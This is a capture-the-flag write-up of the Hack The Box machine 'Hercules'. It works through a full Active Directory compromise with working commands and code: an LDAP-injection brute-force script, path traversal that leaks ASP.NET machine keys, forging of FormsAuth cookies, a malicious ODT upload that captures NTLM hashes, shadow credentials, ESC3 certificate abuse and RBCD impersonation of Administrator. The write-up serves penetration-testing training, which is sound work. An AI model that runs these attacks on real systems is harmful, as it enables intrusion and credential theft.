---
layout: ../../layouts/MarkdownLayout.astro
title: HTB - Hercules
date: 2025-10-18
difficulty: Insane
tags: [Windows]
---

## Reconnaissance

### Adding the Host and Configuring Kerberos

```bash
echo "10.10.11.91 hercules.htb dc.hercules.htb" | sudo tee -a /etc/hosts
```

Edit `/etc/krb5.conf`:

```ini
[libdefaults]
 dns_lookup_kdc = false
 dns_lookup_realm = false
 default_realm = HERCULES.HTB

[realms]
 HERCULES.HTB = {
   kdc = dc.hercules.htb
   admin_server = dc.hercules.htb
   default_domain = hercules.htb
 }

[domain_realm]
 .hercules.htb = HERCULES.HTB
 hercules.htb = HERCULES.HTB
```

### Nmap Scan

```bash
nmap -sC -sV -vv -oA hercules 10.10.11.91
```

Key open ports:

| Port | Service      | Notes                         |
| ---- | ------------ | ----------------------------- |
| 53   | Domain       | Simple DNS Plus               |
| 80   | HTTP         | Microsoft IIS httpd 10.0      |
| 443  | ssl/http     | Microsoft IIS httpd 10.0      |
| 88   | kerberos-sec | Microsoft Windows Kerberos    |
| 389  | LDAP         | Windows Active Directory LDAP |
| 445  | SMB          | Signing required              |

---

## Enumeration

### Username Enumeration

Sync time:

```bash
ntpdate -u 10.10.11.91
```

Generate a name wordlist:

```bash
import string

input_file = "/usr/share/wordlists/names.taxt"
output_file = "test.txt"

def generate_wordlist():
    try:
        with open(input_file, "r") as i, open(output_file, "w") as o:
            for line in i:
                name = line.strip()
                if not name:
                    continue

                for char in string.ascii_lowercase:
                    o.write(f"{name}.{char}\n")

            print(f"Wordlist created {output_file}")
    except FileNotFoundError:
        print(f"Could not find {input_file}")

if __name__ == "__main__":
    generate_wordlist()
```

Enumerate valid domain users against the DC:

```bash
kerbrute userenum --dc 10.10.11.91 -d hercules.htb '/usr/share/wordlists/xato-net-10-million-usernames.txt' -t 100
```

key findings:

- `will.s@hercules.htb`

### Web Enumeration

Navigating to `https://hercules.htb` reveals the homepage. Directory fuzzing uncovers a login page:

```bash
dirb https://hercules.htb
```

Login endpoint: `https://hercules.htb/Login`

![hercules-login](/htb/hercules/hercules1.png)

The login form is rate-limited — after 10 failed attempts, requests are blocked for 30 seconds.

---

## LDAP Filter Injection

**Test payload:**

```
will.s*)(description=*)
```

Response: `"Invalid username"`

**Double encoded payload:**

```
will.s%252A%2529%2528description%253D%252A
```

Response: `"Login attempt failed"`

### Brute-force Script

```python
import re
import string
import time
import urllib3
import requests
from pathlib import Path
from typing import Optional

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://hercules.htb"
LOGIN_PAGE = "/login"
LOGIN_ENDPOINT = "/Login"
VERIFY_TLS = False
REQUEST_TIMEOUT = 5
CHAR_DELAY = 0.01
MAX_DESC_LEN = 50
OUTPUT_FILE = Path("hercules_passwords.txt")

SUCCESS_INDICATOR = "Login attempt failed"

TOKEN_RE = re.compile(
    r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"',
    re.IGNORECASE,
)

CHARSET = (
    string.ascii_lowercase
    + string.digits
    + string.ascii_uppercase
    + "!@#$_*-."
    + "%^&()=+[]{}|;:',<>?/`~\" \\"
)

KNOWN_USERS: list[str] = [
    "adriana.i",
    "angelo.o",
    "ashley.b",
    "bob.w",
    "camilla.b",
    "clarissa.c",
    "elijah.m",
    "fiona.c",
    "harris.d",
    "heather.s",
    "jacob.b",
    "jennifer.a",
    "jessica.e",
    "joel.c",
    "johanna.f",
    "johnathan.j",
    "ken.w",
    "mark.s",
    "mikayla.a",
    "natalie.a",
    "nate.h",
    "patrick.s",
    "ramona.l",
    "ray.n",
    "rene.s",
    "shae.j",
    "stephanie.w",
    "stephen.m",
    "tanya.r",
    "tish.c",
    "vincent.g",
    "will.s",
    "zeke.s",
]


_LDAP_ESCAPE = str.maketrans({"*": "\\2a", "(": "\\28", ")": "\\29"})


def _ldap_escape(value: str) -> str:
    return value.translate(_LDAP_ESCAPE)


def _build_payload(username: str, desc_prefix: str = "") -> str:
    if desc_prefix:
        return f"{username}*)(description={_ldap_escape(desc_prefix)}*"
    return f"{username}*)(description=*"


def _percent_encode(value: str) -> str:
    return "".join(f"%{b:02X}" for b in value.encode())


def _get_csrf_token(session: requests.Session) -> Optional[str]:
    try:
        response = session.get(
            BASE_URL + LOGIN_PAGE, verify=VERIFY_TLS, timeout=REQUEST_TIMEOUT
        )
        match = TOKEN_RE.search(response.text)
        return match.group(1) if match else None
    except requests.RequestException:
        return None


def _probe(username: str, desc_prefix: str = "") -> bool:
    session = requests.Session()
    token = _get_csrf_token(session)
    if not token:
        return False

    payload = _build_payload(username, desc_prefix)
    data = {
        "Username": _percent_encode(payload),
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token,
    }

    try:
        response = session.post(
            BASE_URL + LOGIN_ENDPOINT,
            data=data,
            verify=VERIFY_TLS,
            timeout=REQUEST_TIMEOUT,
        )
        return SUCCESS_INDICATOR in response.text
    except requests.RequestException:
        return False


def enumerate_description(username: str) -> Optional[str]:
    print(f"\n[*] Checking: {username}")

    if not _probe(username):
        print(f"    [-] No description field found")
        return None

    print(f"    [+] Description field present — enumerating…")

    description = ""
    consecutive_misses = 0

    for position in range(MAX_DESC_LEN):
        found_char = None

        for char in CHARSET:
            if _probe(username, description + char):
                found_char = char
                break
            time.sleep(CHAR_DELAY)

        if found_char:
            description += found_char
            consecutive_misses = 0
            print(f"    pos {position:02d}: '{found_char}'  →  {description}")
        else:
            consecutive_misses += 1
            if consecutive_misses >= 2:
                break

    if description:
        print(f"    [✓] {username} => {description}")
        return description

    return None


def _ordered_users() -> list[str]:
    seen: set[str] = set()
    ordered: list[str] = []
    for user in KNOWN_USERS:
        if user not in seen:
            seen.add(user)
            ordered.append(user)
    return ordered


def main() -> None:
    users = _ordered_users()

    found: dict[str, str] = {}

    for username in users:
        description = enumerate_description(username)
        if description:
            found[username] = description
            with OUTPUT_FILE.open("a") as fh:
                fh.write(f"{username}:{description}\n")
            print(f"\n[+] SAVED: {username}:{description}\n")

    print("\n" + "=" * 60)
    print("ENUMERATION COMPLETE")
    print("=" * 60)

    if found:
        print(f"\nFound {len(found)} result(s):")
        for user, pwd in found.items():
            print(f"  {user}: {pwd}")
    else:
        print("\nNo descriptions found.")


if __name__ == "__main__":
    main()
```

Result:

```
johnathan.j => change*th1s_p@ssw()rd!!
```

### Validating the Credential

Spray the discovered password against all enumerated users:

```bash
nxc ldap 10.10.11.91 -u 'users.txt' -p 'change*th1s_p@ssw()rd!!' --continue-on-success -k

LDAP        10.10.11.91  389    DC         [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
```

**Confirmed:** `ken.w : change*th1s_p@ssw()rd!!`

Login to `https://hercules.htb/login` with `ken.w`

---

## LFI

Navigating to `https://hercules.htb/Home/Downloads`, intercept a download request in Burp Suite and modify the `fileName` parameter:

```
GET /Home/Download?fileName=../../web.config
```

Interesting content from `web.config`:

```xml
<machineKey decryption="AES"
  decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
  validation="HMACSHA256"
  validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

![previous-lfi](/htb/hercules/hercules2.png)

The download endpoint doesn't normalize the `fileName` parameter — path traversal returns `web.config`. This file contains the `machineKey` values (decryptionKey and validationKey) used to encrypt and sign legacy ASP.NET FormsAuth cookies. Possessing these keys allows forging a `.ASPXAUTH` cookie that the application will accept as legitimate, enabling arbitrary web role impersonation (e.g., `web_admin`).

---

## Forging a FormsAuth Cookie (.NET)

```bash
dotnet new console -o LegacyConsole
cd LegacyConsole
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
```

Replace `Program.cs` with:

```csharp
using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string validationKey =
            "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";

        string decryptionKey =
            "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        if (validationKey.Length > 128)
            validationKey = validationKey.Substring(0, 128);

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);

        var formsAuthenticationTicket = new FormsAuthenticationTicket(
            1, "web_admin", issueDate, expiryDate, false, "Web Administrators", "/"
        );

        var legacyEncryptor = new LegacyFormsAuthenticationTicketEncryptor(
            decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha256
        );

        var encryptedText = legacyEncryptor.Encrypt(formsAuthenticationTicket);
        Console.WriteLine("Encrypted FormsAuth Ticket:");
        Console.WriteLine(encryptedText);
    }
}
```

```bash
dotnet build && dotnet run
```

Output:

```
7AE4546179B6AA3E4D51F47DA0E1E4CACCADEE5B82024A6F56A02DCDD159C65F1...
```

Place this value as the `.ASPXAUTH` cookie in your browser and reload the page — you are now authenticated as `web_admin`.
The admin panel at `https://hercules.htb/Home/Forms` exposes a **file upload** feature.

![hercules-webAdmin](/htb/hercules/hercules3.png)

---

## Bad-ODF Generation and Upload

```bash
git clone https://github.com/lof1sec/Bad-ODF.git
cd Bad-ODF
python3 -m venv .venv && source .venv/bin/activate
pip install ezodf lxml
python3 Bad-ODF.py   # set your tun0 IP as the listener
```

Upload the generated `bad.odt` via the admin file upload form.
![hercules-odt](/htb/hercules/hercules4.png)

---

## Capturing and Cracking NetNTLMv2

```bash
responder -I tun0
```

Captured hash:

```
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:26c9dfd61427d8d7:3AF49207CF794C9593E4F4C41B7AA8ED
:010100000000000080A8C31C71A7DC01B4C4F133020B7C260000000002000800520049003200340001001E0057004900
4E002D0048005A0032005900580043004500490051004900540004003400570049004E002D0048005A003200590058004
300450049005100490054002E0052004900320034002E004C004F00430041004C000300140052004900320034002E004C
004F00430041004C000500140052004900320034002E004C004F00430041004C000700080080A8C31C71A7DC010600040
0020000000800300030000000000000000000000000200000DCB2E96AA654D6349ED0BD6CD241A009FB43F522202A274B
C6A80D47E39527570A001000000000000000000000000000000000000900220063006900660073002F00310030002E003
10030002E00310035002E003100360038000000000000000000
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Result:

```
natalie.a : Prettyprincess123!
```

---

## BloodHound

```bash
rusthound-ce -u ken.w -p 'change*th1s_p@ssw()rd!!' -d hercules.htb -z --ldaps
```

![hercules-bh](/htb/hercules/hercules5.png)

Key findings from BloodHound:

- `natalie.a` is a member of **Web Support**
- **Web Support** has **GenericWrite** over 6 user accounts
- `auditor` and `ashley.b` are members of **Remote Management Users**
- `stephen.m` is a member of **Security Helpdesk**
- **Security Support** has **ForceChangePassword** over 7 user accounts

---

## Certificate Attacks

### Initial Certificate Acquisition

```bash
impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/natalie.a:Prettyprincess123!
```

Use certipy to shadow the `bob.w` account:

```bash
KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account bob.w
```

```
NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

Request a TGT for `bob.w` using the NT hash:

```bash
impacket-getTGT -dc-ip 10.10.11.91 -hashes :8a65c74e8f0073babbfac6725c66cc3f hercules.htb/bob.w
```

### Directory Enumeration (bob.w)

```bash
KRB5CCNAME=bob.w.ccache bloodyAD -u 'bob.w' -p '' -k -d 'hercules.htb' --host DC.hercules.htb get writable --detail
```

![hercules-bad](/htb/hercules/hercules6.png)
![hercules-bad](/htb/hercules/hercules7.png)
![hercules-bad](/htb/hercules/hercules8.png)

Key findings:

- `CREATE_CHILD` rights on `OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb`
- `WRITE` access on `CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb`

---

## PowerView

```bash
pipx install "git+https://github.com/aniqfakhrul/powerview.py"
```

Connect as `bob.w`:

```bash
KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.10.11.91 -d --no-pass
```

Move `stephen.m` to the Web Department OU:

```bash
Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
```

Moving `stephen.m` to the Web Department OU causes him to inherit its more permissive ACLs, enabling certificate shadowing — specifically the ability to add key credentials to his object (`keyMaterial` / `keyCredentials`), which unlocks certificate-based authentication and NTLM-equivalent credential recovery.

---

## Certificate Abuse — stephen.m

Request a TGT for `natalie.a`:

```bash
impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!'
```

Shadow `stephen.m`:

```bash
KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account 'stephen.m'
```

```
NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
```

Request a TGT for `stephen.m`:

```bash
impacket-getTGT HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210
```

---

## Privilege Escalation

Reset the `auditor` account password using `stephen.m`:

```bash
KRB5CCNAME=stephen.m.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'stephen.m' -k set password Auditor 'Prettyprincess123!'
```

Request a TGT for the `auditor` account:

```bash
impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/Auditor:Prettyprincess123!
```

### User Shell (WinRM)

```bash
git clone https://github.com/ozelis/winrmexec.git
KRB5CCNAME=Auditor.ccache python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

User flag:

```powershell
PS C:\Users\auditor\Documents> type ../Desktop/user.txt
1b00386bd5c9fe08fe08b475f2afad9b
```

---

## OU Takeover (Auditor → GenericAll on Forest Migration)

### Check group membership and Import ActiveDirectory module

```powershell
whoami /groups
Import-Module ActiveDirectory
```

### Check ACL on Forest Migration OU

```powershell
(Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference -like "*Forest Management*"} | Format-List *
```

![hercules-ps](/htb/hercules/hercules9.png)

### Assign Ownership

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

### Grant GenericAll

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

`auditor` now has **Full Control** over the Forest Migration OU:

---

## Account Preparation — fernando.r

```powershell
Get-ADUser -Identity "Fernando.R"

DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

`fernando.r` is a member of **Smartcard Operators** — granting enrollment rights on key templates. Re-enable the account:

![hercules-bh](/htb/hercules/hercules10.png)

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d 'hercules.htb' -u 'auditor' -k remove uac 'fernando.r' -f ACCOUNTDISABLE
```

Reset the password:

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'Test123!'
```

---

## Certificate Attack — ESC3

Request a TGT for `fernando.r`:

```bash
impacket-getTGT 'HERCULES.HTB/fernando.r:Test123!'
```

Find vulnerable certificate templates:

```bash
KRB5CCNAME=fernando.r.ccache certipy-ad find -k -dc-ip 10.10.11.91 -target DC.hercules.htb -vulnerable -stdout

[!] Vulnerabilities
     ESC3                              : Template has Certificate Request Agent EKU set.
```

Request an **Enrollment Agent** certificate from `CA-HERCULES`:

```bash
KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" \
  -k -no-pass -dc-host dc.hercules.htb -dc-ip 10.10.11.91 \
  -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "EnrollmentAgent" \
  -application-policies "Certificate Request Agent"
```

Use the agent certificate to request a **User** certificate on behalf of `ashley.b` (RBCD):

```bash
KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" \
  -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb \
  -target "dc.hercules.htb" -ca "CA-HERCULES" -template "User" \
  -pfx fernando.r.pfx -on-behalf-of "HERCULES\\ashley.b" -dcom
```

Authenticate as `ashley.b`:

```bash
certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.10.11.91
```

```
NT hash for 'ashley.b': 1e719fbfddd226da74f644eac9df7fd2
```

Request a TGT for `ashley.b`:

```bash
impacket-getTGT -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b@dc.hercules.htb
```

WinRM shell as `ashley.b`:

```bash
KRB5CCNAME=ashley.b@dc.hercules.htb.ccache python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
```

---

## IIS_Administrator Account Takeover

Password Reset

![hercules-ps](/htb/hercules/hercules11.png)

Grant `IT SUPPORT` GenericAll permissions

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' \
  -u 'auditor' -k add genericAll \
  'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
```

Grant `Auditor` GenericAll privileges

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host dc.hercules.htb \
  -d hercules.htb -u Auditor -k add genericAll \
  'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

Re-enable the `IIS_Administrator` account (if it fails with insufficientAccessRights, re-run `aCleanup.ps1` script)

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
```

Reset the password:

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k set password "IIS_Administrator" "Test123"
```

Request a TGT:

```bash
impacket-getTGT hercules.htb/'iis_administrator':'Test123' -dc-ip 10.10.11.91
```

---

## Computer Account Compromise & RBCD (S4U2Self/S4U2Proxy)

Reset the `iis_webserver$` computer account password:

```bash
KRB5CCNAME=iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'IIS_Administrator' -k set password "iis_webserver$" Test123
```

Compute the NTLM hash of the new password:

```bash
iconv -f ASCII -t UTF-16LE <(printf 'Test123') | openssl dgst -md4
3b1da22b1973c0bb86d4a9b6a9ae65f6
```

Request a TGT for `IIS_webserver$`:

```bash
impacket-getTGT -hashes :3b1da22b1973c0bb86d4a9b6a9ae65f6 'hercules.htb/IIS_webserver$' -dc-ip 10.10.11.91
```

Extract the Kerberos session key from the ccache:

```bash
impacket-describeTicket 'IIS_webserver$.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : 045f30ed4f9c5b7fbaafc588ce9b9caf
```

Change the computer account password using the extracted session key:

```bash
impacket-changepasswd -newhashes :045f30ed4f9c5b7fbaafc588ce9b9caf 'hercules.htb'/'IIS_webserver$':'Test123'@'dc.hercules.htb' -k
```

`IIS_webserver$` has an `AllowedToAct` entry delegated to `dc.hercules.htb`, enabling RBCD abuse via S4U2Self/S4U2Proxy to impersonate any user against DC services.

---

## Administrator Impersonation

```bash
KRB5CCNAME=IIS_webserver$.ccache impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
```

WinRM shell as Administrator:

```bash
KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

Root flag:

```powershell
PS C:\Users\Administrator\Documents> type C:\Users\admin\Desktop\root.txt
3e608e7bb9b4e6d6ec1a5e6460af1884
```
